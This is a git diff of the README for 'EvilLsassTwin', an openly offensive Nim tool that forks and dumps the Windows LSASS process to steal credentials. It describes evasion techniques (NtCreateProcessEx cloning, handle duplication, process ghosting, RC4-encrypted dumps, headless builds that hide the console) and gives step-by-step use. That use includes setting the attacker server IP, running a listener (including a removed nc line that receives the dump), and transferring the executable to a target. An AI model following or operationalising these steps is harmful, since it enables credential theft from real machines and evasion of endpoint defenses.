@@ -1,39 +1,51 @@
 # Evil Lsass Twin
-Originally, a port of the [Dirty Vanity](https://github.com/deepinstinct/Dirty-Vanity) project to fork and dump the LSASS process. Has been updated upon further research to attempt to duplicate open handles to LSASS. If this fails, it will obtain a handle to LSASS through the NtGetNextProcess function instead of OpenProcess/NtOpenProcess. 
+Originally, a port of the [Dirty Vanity](https://github.com/deepinstinct/Dirty-Vanity) project to fork and dump the LSASS process. Has been updated upon further research to attempt to duplicate open handles to LSASS. If this fails (and it likely will), it will attempt to obtain a handle to LSASS through the `NtGetNextProcess` function instead of `OpenProcess`/`NtOpenProcess`. 
 
-Nim, by default (or rather the Winim module) makes use of dynamic function resolution for Windows API functions, so the IAT should only include a reference to GetProcAddress and LoadLibrary (for better or worse).
+Nim, by default (or rather the Winim module) makes use of dynamic function resolution for Windows API functions, ~~so the IAT should only include a reference to GetProcAddress and LoadLibrary (for better or worse)~~ so the IAT will only contain certain functions standard across all Nim executables.
 
-The process cloning functionality has been updated to use make use of NtCreateProcessEx instead of RtlCreateProcessReflection as this only requires PROCESS_CREATE_PROCESS and does not create an initial thread (thereby triggering process creation kernel callbacks). 
+The process cloning functionality has been updated to use make use of `NtCreateProcessEx` instead of `RtlCreateProcessReflection` as this only requires `PROCESS_CREATE_PROCESS` and does not create an initial thread (thereby triggering process creation kernel callbacks). 
 
 Partial implementation of Process Ghosting technique is included to make use of the Delete On Close functionality. 
 
 How this works: 
-1. MiniDumpWriteDump function is used to dump forked LSASS process's memory into a file on-disk.
+1. `MiniDumpWriteDump` function is used to dump forked LSASS process's memory into a file on-disk.
 2. File is marked with Delete on Close and does not allow other threads to access it simultaneously.
 3. File is mapped into memory
 4. File is deleted after open handle to it is closed
-5. Mapped Data (memory dump) is sent to server
- 
+5. Mapped Data (memory dump) is encrypted and saved to disk *or* sent to server
+
+This will only occur if the tool is set to use the standard Win32 `MiniDumpWriteDump` API function. By default, EvilLsassTwin uses a custom minidump function that will keep the data in memory unless set to save to disk. This allows EvilLsassTwin to keep the dump size to a minimum. 
+
 Requires the `winim` and `ptr_math` modules. Several IOCs and opportunities for detection since this simple port was not originally built with stealth in mind. However, as noted above, this project _does_ include some stealthy features. 
 
 Tested on Windows 10 22H2 and Windows 11 with Defender enabled (Cloud Analysis disabled).
 
-Must be run from an Administrator Command Prompt or Powershell as EvilLsassTwin depends on the SeDebugPrivilege. 
+Must be run from an Administrator Command Prompt or Powershell as EvilLsassTwin depends on `SeDebugPrivilege`. 
 
 _Note: SeDebugPrvilege is enabled by default on Elevated Powershell._
 
-_Note: Tool will **not** work against PPL or Credential Guard. Tool also will not work when EDRs patch LSASS a la [Cortex XDR Modifications](https://www.paloaltonetworks.com/blog/security-operations/detecting-credential-stealing-with-cortex-xdr/)_
+_Note: Tool will **not** work against PPL (try the PPL branch) or Credential Guard. Tool also will not work when EDRs patch LSASS a la [Cortex XDR Modifications](https://www.paloaltonetworks.com/blog/security-operations/detecting-credential-stealing-with-cortex-xdr/)_
 
 # Usage
 This project was developed and tested with Nim 1.6.10 and 1.6.14. It is **not** compatible with Nim 2.0.
 
 1. Install Dependencies with `nim dependencies` or through Nimble package manager (Atlas not yet tested)
-2. Edit line 5  in `EvilLsassTwin.nim` file to include your server's (attacker machine) IP address. Optionally: You may change the port number on line 6 as well. If you do change the port, it needs to be changed within the `EvilTwinServer.nim` file as well.
-3. (Optional) If you want to exfiltrate the dumpfile using SMB instead of a raw socket, edit lines 7 to include the SMB Share name, line 9 (`const useSMB`) to be true and line 10 (`const useRawSocket`) to be false.
+2. Configure settings from lines 15 to 25. Settings include Server IP and Port, SMB Share Name, saving to disk, minidump method (*set to either **useCustom** or **useTraditional***), and exfil method (*set to either **useRaw** or **useSMB***)
 4. Compile the project with `nim build`. _Note: this assumes EvilTwinServer will be run on a Linux machine. Manual compilation required otherwise_
-5. `chmod +x EvilTwinServer && ./EvilTwinServer` Alternatively: `nc -lvnp 6500 > EvilTwin.dmp`
+5. If **not** set to save to file: `chmod +x EvilTwinServer && ./EvilTwinServer`
 6. Transfer EvilLsassTwin.exe to (Windows) target machine and Run.   
 
+# Important Notes
+By default, EvilLsassTwin *will* use RC4 to encrypt the dump and display the encryption key in hexadecimal in the console. EvilTwinServer will attempt to decrypt the dump file automatically for you. However, if this fails, you will have to decrypt the file yourself. This can be done with OpenSSL. Take note of the command used in either the terminal (if running) or in the `EvilTwinServer.nim` file!
+
+Alternatively, if you **don't** want a console screen popping up on the target machine, a "headless" build can be done. Take note of the build command in the `config.nims` file and add option `--app:gui`. Doing so will require you to either use EvilTwinServer or create a custom script/application. This is due to EvilLsassTwin sending the encryption key and then the dump in that order. Should another application be used without modification to the `EvilLsassTwin.nim` file, both encryption key and data are likely to be included in the same file, rendering the dump file useless without even further modification. 
+
+Lastly, EvilTwinServer is **not** required with a standard build. With a simple change to the `EvilLsassTwin.nim` file, another application may be used to receive the encrypted dump file. To do so, simply comment out or remove the following lines: 
+```nim
+echo "[!] Sending Encryption Key to Server..."
+        if not socket.trySend(rc4KeyStr):
+            echo "[-] Could Not Send Encryption Key to Server!"
+```
 # Resources
 [Bill Demirkapi - Abusing Windows Implemention of Fork for Stealthy Memory Operations](https://billdemirkapi.me/abusing-windows-implementation-of-fork-for-stealthy-memory-operations/)
 
@@ -48,3 +60,7 @@ This project was developed and tested with Nim 1.6.10 and 1.6.14. It is **not** 
 [Splintercod3 - The Hidden Side of Seclogon - Part 2](https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-2.html)
 
 [Diversenok - The Definitive Guide to Process Cloning on Windows](https://diversenok.github.io/2023/04/20/Process-Cloning.html)
+
+[NativeDump](https://github.com/ricardojoserf/NativeDump)
+
+[NanoDump](https://github.com/fortra/nanodump)
